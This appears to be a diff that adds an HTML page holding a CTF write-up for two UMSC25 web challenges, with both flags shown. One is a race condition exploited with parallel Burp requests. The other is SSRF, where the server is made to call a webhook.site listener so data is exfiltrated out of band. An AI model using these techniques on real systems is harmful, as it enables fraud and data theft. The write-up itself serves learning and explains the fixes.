@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>UMSC25 Writeup — Web Category</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --green: #39ff6a;
+      --green-dim: #1a7a35;
+      --green-glow: rgba(57,255,106,0.10);
+      --amber: #ffb347;
+      --amber-dim: #a06a10;
+      --red: #ff5f6d;
+      --blue: #58a6ff;
+      --bg: #0a0d0a;
+      --bg2: #0f130f;
+      --bg3: #141914;
+      --border: rgba(57,255,106,0.15);
+      --border-bright: rgba(57,255,106,0.4);
+      --muted: #4a6b4a;
+      --text: #c8f0c8;
+      --mono: 'JetBrains Mono', monospace;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--mono);
+      font-size: 14px;
+      line-height: 1.8;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px
+      );
+      pointer-events: none;
+      z-index: 999;
+    }
+
+    /* ── NAV ── */
+    nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      z-index: 100;
+      background: rgba(10,13,10,0.93);
+      border-bottom: 1px solid var(--border);
+      backdrop-filter: blur(8px);
+      padding: 0 2rem;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+    }
+
+    nav a {
+      text-decoration: none;
+      font-size: 13px;
+    }
+
+    .nav-back {
+      color: var(--muted);
+      transition: color 0.2s;
+    }
+
+    .nav-back:hover { color: var(--green); }
+    .nav-back::before { content: '← '; }
+
+    .nav-crumb { color: var(--muted); font-size: 13px; }
+    .nav-crumb span { color: var(--green); }
+
+    /* ── LAYOUT ── */
+    .page {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 5rem 2rem 6rem;
+    }
+
+    /* ── HEADER ── */
+    .post-header {
+      margin-bottom: 3rem;
+      padding-bottom: 2rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .post-eyebrow {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 0.6rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .tag {
+      font-size: 11px;
+      padding: 3px 10px;
+      border-radius: 2px;
+      border: 1px solid;
+    }
+
+    .tag-ctf {
+      color: var(--amber);
+      border-color: rgba(255,179,71,0.4);
+      background: rgba(255,179,71,0.07);
+    }
+
+    .tag-cat {
+      color: var(--green);
+      border-color: var(--border-bright);
+      background: var(--green-glow);
+    }
+
+    .tag-diff-easy {
+      color: #50fa7b;
+      border-color: rgba(80,250,123,0.35);
+      background: rgba(80,250,123,0.07);
+    }
+
+    .tag-diff-medium {
+      color: var(--amber);
+      border-color: rgba(255,179,71,0.35);
+      background: rgba(255,179,71,0.07);
+    }
+
+    .post-title {
+      font-size: clamp(1.6rem, 4vw, 2.4rem);
+      font-weight: 700;
+      color: var(--green);
+      line-height: 1.2;
+      letter-spacing: -0.02em;
+      margin-bottom: 0.8rem;
+    }
+
+    .post-meta {
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .post-meta span { color: var(--green-dim); }
+
+    /* ── TOC ── */
+    .toc {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 1.2rem 1.4rem;
+      margin-bottom: 3rem;
+    }
+
+    .toc-title {
+      font-size: 11px;
+      color: var(--amber);
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      margin-bottom: 0.8rem;
+    }
+
+    .toc-title::before { content: '$ '; color: var(--green-dim); }
+
+    .toc ol {
+      list-style: none;
+      counter-reset: toc-counter;
+    }
+
+    .toc ol li {
+      counter-increment: toc-counter;
+      padding: 3px 0;
+    }
+
+    .toc ol li::before {
+      content: counter(toc-counter, decimal-leading-zero) '. ';
+      color: var(--green-dim);
+      font-size: 12px;
+    }
+
+    .toc a {
+      color: var(--text);
+      text-decoration: none;
+      font-size: 13px;
+      transition: color 0.2s;
+    }
+
+    .toc a:hover { color: var(--green); }
+
+    /* ── CHALLENGE SECTIONS ── */
+    .challenge {
+      margin-bottom: 4.5rem;
+    }
+
+    .challenge-header {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin-bottom: 1.5rem;
+      flex-wrap: wrap;
+    }
+
+    .challenge-num {
+      font-size: 12px;
+      color: var(--green-dim);
+    }
+
+    h2.challenge-title {
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: var(--green);
+    }
+
+    /* ── PROSE ── */
+    .prose p {
+      margin-bottom: 1rem;
+      color: var(--text);
+      opacity: 0.88;
+    }
+
+    .prose strong { color: var(--green); font-weight: 500; }
+    .prose code {
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      padding: 1px 6px;
+      border-radius: 3px;
+      font-size: 13px;
+      color: var(--amber);
+    }
+
+    /* ── STEP BLOCKS ── */
+    .steps {
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+      margin: 1.5rem 0;
+    }
+
+    .step {
+      display: flex;
+      gap: 1rem;
+    }
+
+    .step-num {
+      flex-shrink: 0;
+      width: 26px;
+      height: 26px;
+      border: 1px solid var(--border-bright);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--green);
+      margin-top: 2px;
+    }
+
+    .step-content {
+      flex: 1;
+    }
+
+    .step-content p {
+      margin-bottom: 0.5rem;
+      color: var(--text);
+      opacity: 0.88;
+    }
+
+    /* ── INFO BLOCKS ── */
+    .callout {
+      border-left: 3px solid;
+      padding: 0.8rem 1rem;
+      border-radius: 0 4px 4px 0;
+      margin: 1.2rem 0;
+      font-size: 13px;
+    }
+
+    .callout-info {
+      border-color: var(--blue);
+      background: rgba(88,166,255,0.07);
+      color: var(--blue);
+    }
+
+    .callout-success {
+      border-color: var(--green);
+      background: var(--green-glow);
+      color: var(--green);
+    }
+
+    .callout-warn {
+      border-color: var(--amber);
+      background: rgba(255,179,71,0.07);
+      color: var(--amber);
+    }
+
+    .callout-label {
+      font-size: 10px;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      margin-bottom: 0.3rem;
+      opacity: 0.7;
+    }
+
+    .callout p { margin: 0; }
+
+    /* ── FLAG DISPLAY ── */
+    .flag-block {
+      background: var(--bg2);
+      border: 1px solid var(--border-bright);
+      border-radius: 4px;
+      padding: 1rem 1.4rem;
+      margin: 1.5rem 0;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      flex-wrap: wrap;
+    }
+
+    .flag-icon {
+      font-size: 11px;
+      color: var(--green-dim);
+      letter-spacing: 0.08em;
+    }
+
+    .flag-val {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--green);
+      word-break: break-all;
+    }
+
+    /* ── IMAGES ── */
+    .img-row {
+      display: flex;
+      gap: 0.8rem;
+      margin: 1.2rem 0;
+      flex-wrap: wrap;
+    }
+
+    .img-row.single { display: block; }
+
+    .img-wrap {
+      flex: 1;
+      min-width: 200px;
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .img-wrap img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .img-caption {
+      font-size: 11px;
+      color: var(--muted);
+      padding: 6px 10px;
+      border-top: 1px solid var(--border);
+      text-align: center;
+    }
+
+    /* ── TERMINAL BLOCK ── */
+    .term {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      overflow: hidden;
+      margin: 1.2rem 0;
+    }
+
+    .term-bar {
+      background: var(--bg3);
+      border-bottom: 1px solid var(--border);
+      padding: 7px 12px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .dot { width: 9px; height: 9px; border-radius: 50%; }
+    .dot.r { background: #ff5f57; }
+    .dot.y { background: #febc2e; }
+    .dot.g { background: #28c840; }
+    .term-bar-label { font-size: 11px; color: var(--muted); margin-left: 4px; }
+
+    .term-body {
+      padding: 0.9rem 1.1rem;
+      font-size: 13px;
+    }
+
+    .tl { margin-bottom: 0.2rem; }
+    .tl .p { color: var(--green); }
+    .tl .c { color: var(--text); }
+    .tl .o { color: var(--muted); }
+    .tl .v { color: var(--amber); }
+    .tl .e { color: var(--red); }
+
+    /* ── DIVIDER ── */
+    .challenge-divider {
+      border: none;
+      border-top: 1px dashed var(--border);
+      margin: 3.5rem 0;
+    }
+
+    /* ── FOOTER ── */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 2rem;
+      text-align: center;
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    footer a {
+      color: var(--green-dim);
+      text-decoration: none;
+    }
+
+    footer a:hover { color: var(--green); }
+
+    @media (max-width: 500px) {
+      .img-row { flex-direction: column; }
+    }
+  </style>
+</head>
+<body>
+
+  <nav>
+    <a href="../index.html" class="nav-back">back</a>
+    <span class="nav-crumb">writeups / <span>umsc25</span></span>
+  </nav>
+
+  <div class="page">
+
+    <!-- POST HEADER -->
+    <header class="post-header">
+      <div class="post-eyebrow">
+        <span class="tag tag-ctf">UMSC25</span>
+        <span class="tag tag-cat">web exploitation</span>
+        <span class="tag tag-diff-easy">easy</span>
+        <span class="tag tag-diff-medium">medium</span>
+      </div>
+      <h1 class="post-title">UMSC25 CTF — Web Category Writeup</h1>
+      <p class="post-meta">
+        <span>author:</span> 0xYOURHANDLE &nbsp;·&nbsp;
+        <span>event:</span> UMSC 2025 &nbsp;·&nbsp;
+        <span>category:</span> Web &nbsp;·&nbsp;
+        <span>solved:</span> 2/2
+      </p>
+    </header>
+
+    <!-- TOC -->
+    <nav class="toc">
+      <div class="toc-title">table of contents</div>
+      <ol>
+        <li><a href="#straightforward">Straightforward — Race Condition / Parallel Requests</a></li>
+        <li><a href="#healthcheck">Healthcheck — SSRF via Webhook</a></li>
+      </ol>
+    </nav>
+
+    <!-- ═══════════════════════════════════════════ -->
+    <!-- CHALLENGE 1: STRAIGHTFORWARD                -->
+    <!-- ═══════════════════════════════════════════ -->
+    <section class="challenge" id="straightforward">
+
+      <div class="challenge-header">
+        <span class="challenge-num">01 /</span>
+        <h2 class="challenge-title">Straightforward</h2>
+        <span class="tag tag-cat">web</span>
+        <span class="tag tag-diff-easy">easy</span>
+      </div>
+
+      <!-- Description -->
+      <div class="prose">
+        <p>
+          We're given a website that lets you collect a <strong>daily bonus of $1,000</strong> by clicking a button.
+          The starting balance is <strong>$1,000</strong>, but to redeem the secret reward and reveal the flag,
+          you need <strong>$3,000</strong> — meaning you'd normally have to wait two days.
+          The challenge? Bypassing that restriction.
+        </p>
+      </div>
+
+      <div class="img-row">
+        <div class="img-wrap">
+          <img src="../writeup-media/image1.jpeg" alt="Challenge website — daily bonus interface" />
+          <div class="img-caption">fig 1 — challenge website with daily bonus button</div>
+        </div>
+        <div class="img-wrap">
+          <img src="../writeup-media/image2.jpeg" alt="Redeem rewards page showing $3000 requirement" />
+          <div class="img-caption">fig 2 — redeem rewards requires $3,000</div>
+        </div>
+      </div>
+
+      <!-- Vulnerability -->
+      <div class="callout callout-info">
+        <div class="callout-label">vulnerability</div>
+        <p>Race condition — the <code>/claim</code> endpoint doesn't handle concurrent requests atomically, allowing us to claim the bonus multiple times in a single burst before the server can update the balance.</p>
+      </div>
+
+      <!-- Steps -->
+      <div class="steps">
+
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-content">
+            <p>Open <strong>Burp Suite</strong> and intercept the HTTP request fired when clicking the "Collect Bonus" button.</p>
+            <div class="img-row single">
+              <div class="img-wrap">
+                <img src="../writeup-media/image3.jpeg" alt="Burp Suite intercepting the claim request" />
+                <div class="img-caption">fig 3 — intercepting the /claim request in Burp Suite</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-content">
+            <p>
+              Send the intercepted <code>POST /claim</code> request to the <strong>Repeater</strong>.
+              From there, use <strong>"Send Group in Parallel"</strong> to fire multiple identical requests simultaneously.
+              This exploits the race window before the server records the first claim.
+            </p>
+            <div class="img-row single">
+              <div class="img-wrap">
+                <img src="../writeup-media/image4.jpeg" alt="Burp Repeater with parallel send option" />
+                <div class="img-caption">fig 4 — grouping requests for parallel send in Repeater</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-content">
+            <p>
+              After the parallel requests land, the balance jumps well past <strong>$3,000</strong> —
+              multiple claims processed before any could be rejected.
+            </p>
+            <div class="img-row single">
+              <div class="img-wrap">
+                <img src="../writeup-media/image5.jpeg" alt="Balance after parallel requests" />
+                <div class="img-caption">fig 5 — balance is now sufficient to redeem</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-content">
+            <p>Click <strong>Redeem Rewards</strong>. The server now accepts the request and reveals the flag.</p>
+            <div class="img-row single">
+              <div class="img-wrap">
+                <img src="../writeup-media/image6.jpeg" alt="Flag revealed after redeeming reward" />
+                <div class="img-caption">fig 6 — flag revealed</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- /steps -->
+
+      <!-- Key concept callout -->
+      <div class="callout callout-warn">
+        <div class="callout-label">key concept — race condition</div>
+        <p>
+          A race condition occurs when a system's behaviour depends on the sequence or timing of uncontrollable events.
+          Here, the server checks the cooldown and updates it in two separate operations — sending many requests
+          simultaneously lets us slip through the gap between those two steps.
+          The fix is an atomic check-and-update (e.g. database transactions or idempotency keys).
+        </p>
+      </div>
+
+      <!-- Flag -->
+      <div class="flag-block">
+        <span class="flag-icon">FLAG</span>
+        <span class="flag-val">UMCS{th3_s0lut10n_1s_pr3tty_sr41ghtf0rw4rd_too!}</span>
+      </div>
+
+    </section>
+
+    <hr class="challenge-divider" />
+
+    <!-- ═══════════════════════════════════════════ -->
+    <!-- CHALLENGE 2: HEALTHCHECK                    -->
+    <!-- ═══════════════════════════════════════════ -->
+    <section class="challenge" id="healthcheck">
+
+      <div class="challenge-header">
+        <span class="challenge-num">02 /</span>
+        <h2 class="challenge-title">Healthcheck</h2>
+        <span class="tag tag-cat">web</span>
+        <span class="tag tag-diff-medium">medium</span>
+      </div>
+
+      <!-- Description -->
+      <div class="prose">
+        <p>
+          We're given a website that accepts a URL and returns the HTTP response code for that page —
+          essentially a server-side URL fetcher. The challenge description teases:
+          <em style="color:var(--amber)">"I left my hopes_and_dreams on the server."</em>
+        </p>
+      </div>
+
+      <div class="img-row">
+        <div class="img-wrap">
+          <img src="../writeup-media/image7.jpeg" alt="Healthcheck website UI" />
+          <div class="img-caption">fig 1 — healthcheck website</div>
+        </div>
+        <div class="img-wrap">
+          <img src="../writeup-media/image8.png" alt="Source or response view" />
+          <div class="img-caption">fig 2 — website fetches and returns status codes</div>
+        </div>
+      </div>
+
+      <!-- Recon -->
+      <div class="prose">
+        <p>
+          Initial attempts with <strong>XSS</strong>, <strong>SQLi</strong>, and various command injection payloads all failed.
+          The application appeared to only fetch URLs and return status codes — no obvious injection points.
+          Shifting approach, we recognised this as a classic <strong>SSRF</strong> (Server-Side Request Forgery) target.
+        </p>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-label">vulnerability</div>
+        <p>
+          SSRF — the server fetches arbitrary URLs supplied by the user, including internal resources.
+          By pointing it at our own webhook, we can observe what data the server sends out of band,
+          and by crafting the URL path, we can probe internal file locations.
+        </p>
+      </div>
+
+      <div class="steps">
+
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-content">
+            <p>
+              Go to <strong>webhook.site</strong> and generate a unique listener URL.
+              This will receive any HTTP requests made by the target server.
+            </p>
+            <div class="img-row single">
+              <div class="img-wrap">
+                <img src="../writeup-media/image10.png" alt="Webhook.site unique URL" />
+                <div class="img-caption">fig 3 — webhook.site listener ready</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-content">
+            <p>
+              The challenge hint says the secret is stored at a path called <code>hopes_and_dreams</code> on the server.
+              We craft a payload that points the healthcheck at our webhook with the hint as a path component,
+              so the server's outbound request leaks information about itself:
+            </p>
+            <div class="term">
+              <div class="term-bar">
+                <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+                <span class="term-bar-label">payload</span>
+              </div>
+              <div class="term-body">
+                <div class="tl"><span class="p">payload: </span><span class="v">http://&lt;your-webhook-url&gt;/hopes_and_dreams</span></div>
+                <div class="tl"><span class="o"># server fetches this URL, webhook captures the request</span></div>
+              </div>
+            </div>
+            <div class="img-row single">
+              <div class="img-wrap">
+                <img src="../writeup-media/image9.jpeg" alt="Payload entered into the healthcheck input" />
+                <div class="img-caption">fig 4 — SSRF payload with webhook URL in input field</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-content">
+            <p>
+              Back on webhook.site, the incoming request from the target server is captured.
+              The flag is embedded in the request headers or body sent by the server.
+            </p>
+            <div class="img-row single">
+              <div class="img-wrap">
+                <img src="../writeup-media/image11.jpeg" alt="Webhook receiving the flag from the server" />
+                <div class="img-caption">fig 5 — webhook captures the server's request containing the flag</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- /steps -->
+
+      <div class="callout callout-warn">
+        <div class="callout-label">key concept — SSRF</div>
+        <p>
+          Server-Side Request Forgery tricks a server into making HTTP requests on your behalf.
+          The server often has access to internal resources (metadata APIs, localhost services, internal files)
+          that you can't reach directly. Using an out-of-band channel like webhook.site is a reliable way
+          to confirm SSRF and exfiltrate data even when the app doesn't echo the response body.
+        </p>
+      </div>
+
+      <!-- Flag -->
+      <div class="flag-block">
+        <span class="flag-icon">FLAG</span>
+        <span class="flag-val">umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr34ms}</span>
+      </div>
+
+    </section>
+
+  </div><!-- /page -->
+
+  <footer>
+    <a href="../index.html">← back to portfolio</a>
+    &nbsp;·&nbsp;
+    writeup by <span style="color:var(--green-dim)">0xYOURHANDLE</span>
+    &nbsp;·&nbsp;
+    UMSC 2025
+  </footer>
+
+</body>
+</html>
